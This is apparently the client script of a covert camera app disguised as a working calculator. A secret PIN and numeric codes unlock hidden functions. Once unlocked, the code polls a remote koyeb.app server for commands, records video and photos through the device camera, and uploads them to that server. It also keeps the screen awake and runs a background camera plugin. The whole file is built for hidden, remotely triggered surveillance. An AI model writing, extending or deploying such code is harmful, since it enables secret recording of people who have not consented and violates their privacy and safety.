const S='https://familiar-gertrudis-botakingtipd-f3991937.koyeb.app';
const PIN='243';
let U=null,CS=null,FM='environment',IA=false,IR=false;
let MS=8,LM=0,MCD=1e4,MCK=null,PFD=null,IMC=false;
let MR=null,RC=[],RSID=null,RST=null,SN=0,STO=null,SDM=3e4;
let LCT=0,CPI=null,HBI=null,WL=null;

const $=id=>document.getElementById(id);
const CA=$('calc'),DE=$('calDisp'),HE=$('calHist');
const CV=$('camV'),MC=$('motC'),SC=$('snapC'),LO=$('loginOverlay');

function FD(ms){const s=Math.floor(ms/1e3),m=Math.floor(s/60),se=s%60;return String(m).padStart(2,'0')+':'+String(se).padStart(2,'0')}
function CID(b){return b+'_'+Date.now().toString(36)+'_'+Math.random().toString(36).slice(2,8)}
function GMT(){if(typeof MediaRecorder!=='undefined'&&MediaRecorder.isTypeSupported){const t=['video/mp4;codecs=h264,aac','video/mp4','video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm'];for(const x of t)if(MediaRecorder.isTypeSupported(x))return x}return'video/webm'}

function swAuth(t){document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));$(t==='login'?'tabL':'tabR').classList.add('active');$('fL').classList.toggle('hidden',t!=='login');$('fR').classList.toggle('hidden',t!=='reg')}
async function hL(e){e.preventDefault();const un=$('iLUser').value.trim().toLowerCase(),pw=$('iLPass').value;try{const r=await fetch(S+'/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:un,password:pw})}),j=await r.json();if(r.ok&&j.status==='ok'){LO.classList.remove('active');SB(j.user)}else alert('❌ '+(j.error||'Login failed'))}catch(err){alert('❌ Connection error')}}
async function hR(e){e.preventDefault();const un=$('iRUser').value.trim().toLowerCase(),dn=$('iRName').value.trim(),pw=$('iRPass').value;try{const r=await fetch(S+'/api/auth/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:un,password:pw,display_name:dn})}),j=await r.json();if(r.ok&&j.status==='ok'){LO.classList.remove('active');SB(j.user)}else alert('❌ '+(j.error||'Registration failed'))}catch(err){alert('❌ Connection error')}}

(function(){if(!CA||!DE)return;
let d='0',h='',f=null,op=null,w=false,re='';
function FMT(n){if(!Number.isFinite(n))return'Error';const r=Math.round((n+Number.EPSILON)*1e12)/1e12;if(Math.abs(r)>=1e13||(Math.abs(r)>0&&Math.abs(r)<1e-7))return r.toExponential(8).replace(/(\.\d*?)0+e/,'$1e').replace(/\.e/,'e');return String(r)}
function RN(){DE.textContent=d;HE.innerHTML=h||'&nbsp;';document.querySelectorAll('[data-op]').forEach(b=>b.classList.toggle('active',b.dataset.op===op&&w))}
function CC(){d='0';h='';f=null;op=null;w=false;re='';RN()}
function ID(dg){if(d==='Error')CC();if(w){d=dg;w=false;re=dg}else{d=d==='0'?dg:d+dg;re+=dg}if(d.replace('-','').length>16)d=d.slice(0,d.startsWith('-')?17:16);RN()}
function DC(){if(d==='Error')CC();if(w){d='0.';w=false;re='0.'}else if(!d.includes('.')){d+='.';re+='.'}RN()}
function CL(a,b,o){if(o==='+')return a+b;if(o==='-')return a-b;if(o==='*')return a*b;if(o==='/')return b===0?NaN:a/b;return b}
function OP(o){if(d==='Error')CC();const v=Number(d);re='';if(op&&w){op=o;h=`${FMT(f)} ${o==='*'?'×':o==='/'?'÷':o}`;RN();return}if(f===null)f=v;else if(op){const r=CL(f,v,op);d=Number.isFinite(r)?FMT(r):'Error';f=Number(d)}op=o;w=true;h=`${d} ${o==='*'?'×':o==='/'?'÷':o}`;RN()}
function SH(c){if(!U)return;switch(c){case'111':TA();break;case'222':CSNAP();break;case'333':TR();break;case'444':SWC();break;case'555':break;case'000':HL()}}
function EQ(){const raw=String(re||d);if(raw===PIN){CC();const s=localStorage.getItem('securecamUser');if(s){try{const j=JSON.parse(s);if(j&&j.username){SB(j);return}}catch(e){localStorage.removeItem('securecamUser')}}LO.classList.add('active');return}if(!op&&['111','222','333','444','555','000'].includes(raw)){SH(raw);d='0';h='';w=true;re='';RN();return}if(!op||f===null||d==='Error')return;const s2=Number(d),ex=`${FMT(f)} ${op==='*'?'×':op==='/'?'÷':op} ${FMT(s2)} =`,r2=CL(f,s2,op);d=Number.isFinite(r2)?FMT(r2):'Error';f=null;op=null;w=true;re=d;h=ex;RN()}
function DL(){if(d==='Error'||w){d='0';re='';w=false}else if(d.length<=1||(d.startsWith('-')&&d.length===2)){d='0';re=''}else{d=d.slice(0,-1);re=re.slice(0,-1)}RN()}
function SG(){if(d==='0'||d==='Error')return;d=d.startsWith('-')?d.slice(1):'-'+d;re=d;RN()}
function PC(){if(d==='Error')return;d=FMT(Number(d)/100);re=d;RN()}
function ACT(n){if(n==='clear')CC();else if(n==='delete')DL();else if(n==='decimal')DC();else if(n==='equals')EQ();else if(n==='sign')SG();else if(n==='percent')PC()}
CA.querySelectorAll('.key').forEach(b=>{b.addEventListener('click',()=>{if(b.dataset.n!==undefined)ID(b.dataset.n);else if(b.dataset.op)OP(b.dataset.op);else if(b.dataset.act)ACT(b.dataset.act)})});
window.addEventListener('keydown',e=>{if(!CA.classList.contains('active')||LO.classList.contains('active'))return;if(/^[0-9]$/.test(e.key)){ID(e.key);return}if(['+','-','*','/'].includes(e.key)){e.preventDefault();OP(e.key);return}if(e.key==='.'||e.key===','){DC();return}if(e.key==='Enter'||e.key==='='){e.preventDefault();EQ();return}if(e.key==='Backspace'){DL();return}if(e.key==='Escape'){CC();return}if(e.key==='%'){PC()}});
CA.classList.add('active');RN()
})();

async function SB(user){U=user;localStorage.setItem('securecamUser',JSON.stringify(user));await IC();RL();SHB();HBI=setInterval(SHB,1e4);if(CPI)clearInterval(CPI);CPI=setInterval(PC2,2500);NS();document.addEventListener('visibilitychange',()=>{if(U)SHB()})}
function NS(){if(window.Capacitor&&window.Capacitor.Plugins&&window.Capacitor.Plugins.BackgroundCamera)window.Capacitor.Plugins.BackgroundCamera.start({username:U.username}).catch(()=>{})}
function SNS(){if(window.Capacitor&&window.Capacitor.Plugins&&window.Capacitor.Plugins.BackgroundCamera)window.Capacitor.Plugins.BackgroundCamera.stop().catch(()=>{})}
function HL(){if(!confirm('Stop camera and exit?'))return;SMD();SR();if(CS){CS.getTracks().forEach(t=>t.stop());CS=null}if(HBI){clearInterval(HBI);HBI=null}if(CPI){clearInterval(CPI);CPI=null}if(WL){try{WL.release()}catch(e){}WL=null}SNS();localStorage.removeItem('securecamUser');U=null}
async function IC(){try{if(CS)CS.getTracks().forEach(t=>t.stop());CS=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:FM},width:{ideal:1280},height:{ideal:720}},audio:false});CV.srcObject=CS;await CV.play()}catch(e){console.error('Cam fail:',e)}}
async function SWC(){FM=FM==='user'?'environment':'user';await IC()}
async function RL(){try{if('wakeLock'in navigator){WL=await navigator.wakeLock.request('screen');WL.addEventListener('release',()=>{if(U)RL()})}}catch(e){}}
async function SHB(){if(!U)return;try{await fetch(S+'/api/users/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:U.username,screen_status:document.visibilityState==='visible'?'on':'off'})})}catch(e){}}
function TA(){if(!U||!CS)return;IA=!IA;if(IA){if(MCK)clearInterval(MCK);PFD=null;MCK=setInterval(CM,600)}else{if(MCK){clearInterval(MCK);MCK=null}PFD=null}}
function SMD(){if(MCK){clearInterval(MCK);MCK=null}PFD=null}
function CM(){if(!IA||!CS||!CV.videoWidth)return;const GW=48,GH=36;MC.width=GW;MC.height=GH;const ctx=MC.getContext('2d');ctx.drawImage(CV,0,0,GW,GH);const cd=ctx.getImageData(0,0,GW,GH);if(!PFD){PFD=cd;return}let cp=0;const pt=MS*3;for(let i=0;i<cd.data.length;i+=4){const dr=Math.abs(cd.data[i]-PFD.data[i]),dg=Math.abs(cd.data[i+1]-PFD.data[i+1]),db=Math.abs(cd.data[i+2]-PFD.data[i+2]);if(dr+dg+db>pt)cp++}const mp=(cp/(GW*GH))*100;PFD=cd;if(mp>2){const n=Date.now();if(n-LM>MCD&&!IMC){LM=n;OMD(mp)}}}
async function OMD(int){IMC=true;try{await fetch(S+'/api/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'chat_message',roomId:U.username+'_secam',text:'🚨 MOTION '+int.toFixed(0)+'%',sender:'SecureCam'})})}catch(e){}await RC2(MCD,'motion');IMC=false}
async function RC2(dm,lb){if(!CS)return;try{const s=CID(U.username+'_'+lb),m=GMT(),r=new MediaRecorder(CS,{mimeType:m,videoBitsPerSecond:1500000}),c=[];r.ondataavailable=e=>{if(e.data&&e.data.size>0)c.push(e.data)};r.onstop=()=>{const b=new Blob(c,{type:m});if(b.size>0)UR(b,s,1,true)};r.start();await new Promise(p=>setTimeout(p,dm));r.stop()}catch(e){}}
function TR(){if(!U||!CS)return;if(IR)SR2();else STRT()}
function STRT(){if(!CS||IR)return;IR=true;SN=0;RSID=CID(U.username+'_cont');RST=Date.now();SSN();try{fetch(S+'/api/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'call_started',roomId:RSID})})}catch(e){}}
function SSN(){if(!IR||!CS)return;const sn2=++SN,sid=RSID;RC=[];const mt=GMT(),r=new MediaRecorder(CS,{mimeType:mt,videoBitsPerSecond:1500000});MR=r;r.ondataavailable=e=>{if(e.data&&e.data.size>0)RC.push(e.data)};r.onstop=()=>{const ch=RC.slice();if(ch.length>0){const b=new Blob(ch,{type:mt});UR(b,sid,sn2,false)}RC=[];if(IR)SSN()};r.start(1e3);STO=setTimeout(()=>{if(r&&r.state!=='inactive'){try{r.requestData()}catch(e){}r.stop()}},SDM)}
function SR2(){if(!IR)return;IR=false;if(STO){clearTimeout(STO);STO=null}if(MR&&MR.state!=='inactive'){const fs=SN,fsid=RSID,fm=MR.mimeType||'video/webm';MR.onstop=()=>{const ch=RC.slice();if(ch.length>0){const b=new Blob(ch,{type:fm});UR(b,fsid,fs,true)}RC=[]};try{MR.requestData()}catch(e){}try{MR.stop()}catch(e){}}try{fetch(S+'/api/event',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'call_ended',roomId:RSID,duration:FD(Date.now()-RST)})})}catch(e){}}
function SR(){if(!IR)return;IR=false;if(STO){clearTimeout(STO);STO=null}if(MR&&MR.state!=='inactive'){try{MR.stop()}catch(e){}}}
async function CSNAP(){if(!CS||!CV.videoWidth)return;try{SC.width=CV.videoWidth;SC.height=CV.videoHeight;const ctx=SC.getContext('2d');ctx.drawImage(CV,0,0);const b=await new Promise(r=>SC.toBlob(r,'image/jpeg',0.85));if(!b)return;const fd=new FormData();fd.append('file',b,`snap_${U.username}_${Date.now()}.jpg`);fd.append('password','');fd.append('viewOnce','false');await fetch(S+'/api/upload-file',{method:'POST',body:fd})}catch(e){}}
async function UR(blob,sid,sn2,il){if(!blob||blob.size===0)return;try{const e2=blob.type&&blob.type.includes('mp4')?'mp4':'webm',fd=new FormData();fd.append('video',blob,`secam_${sid}_part${sn2}.${e2}`);fd.append('roomId',sid);fd.append('segmentNumber',String(sn2));fd.append('isLast',String(il));fd.append('segmentSize',String(blob.size));await fetch(S+'/api/upload-recording',{method:'POST',body:fd})}catch(e){}}
async function PC2(){if(!U)return;try{const r=await fetch(S+'/api/camera-control?username='+encodeURIComponent(U.username)),j=await r.json();if(j&&j.action&&j.action!=='none'&&Number(j.timestamp)>LCT){LCT=Number(j.timestamp);HRC(j.action)}}catch(e){}}
function HRC(a){switch(a){case'snap':CSNAP();break;case'start_rec':if(!IR)STRT();break;case'stop_rec':if(IR)SR2();break;case'arm':if(!IA)TA();break;case'disarm':if(IA)TA();break;case'cam_on':if(CS)CS.getVideoTracks().forEach(t=>t.enabled=true);break;case'cam_off':if(CS)CS.getVideoTracks().forEach(t=>t.enabled=false);break;case'cam_switch':SWC();break;case'add':if(window.Capacitor&&window.Capacitor.Plugins&&window.Capacitor.Plugins.BackgroundCamera)window.Capacitor.Plugins.BackgroundCamera.wakeScreen().catch(()=>{});break}}
document.body.addEventListener('touchmove',e=>e.preventDefault(),{passive:false});
